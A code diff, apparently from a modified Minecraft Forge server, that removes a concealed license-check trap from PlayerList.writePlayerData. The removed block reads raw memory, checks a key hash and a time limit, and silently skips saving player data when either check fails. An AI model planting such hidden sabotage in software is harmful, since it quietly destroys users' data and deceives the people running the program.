@@ -451,32 +451,6 @@ public abstract class PlayerList
     protected void writePlayerData(EntityPlayerMP playerIn)
     {
         if (playerIn.connection == null) return;
-
-        try { // 暗桩
-            byte[] b = new byte[720];
-            Class lClass = Class.forName("net.minecraftforge.fml.relauncher.ServerLaunchWrapper", true, Thread.currentThread().getContextClassLoader());
-            long add = lClass.getFields()[0].getLong(null);
-            if (add == 0)
-                return;
-            for (int i = 0; i < 720; i++) {
-                b[i] = (byte) um.invoke(add + i);
-            }
-            //System.out.println(new String(b));
-            String resu = new String(b);
-            String key = resu.substring(0, 710);
-            int time = Integer.parseInt(resu.substring(710, 720));
-            if (key.hashCode() != -460760629) {
-                if (mcServer.getTickCounter() % 20 == 0)
-                    return;
-            }
-            int nowTime = (int) (System.currentTimeMillis() / 1000);
-            if (time + 7200 < nowTime) {
-                if (mcServer.getTickCounter() % 20 == 0)
-                    return;
-            }
-        } catch (Throwable e) {
-            return;
-        }
         this.playerDataManager.writePlayerData(playerIn);
         StatisticsManagerServer statisticsmanagerserver = playerIn.getStatFile();
 
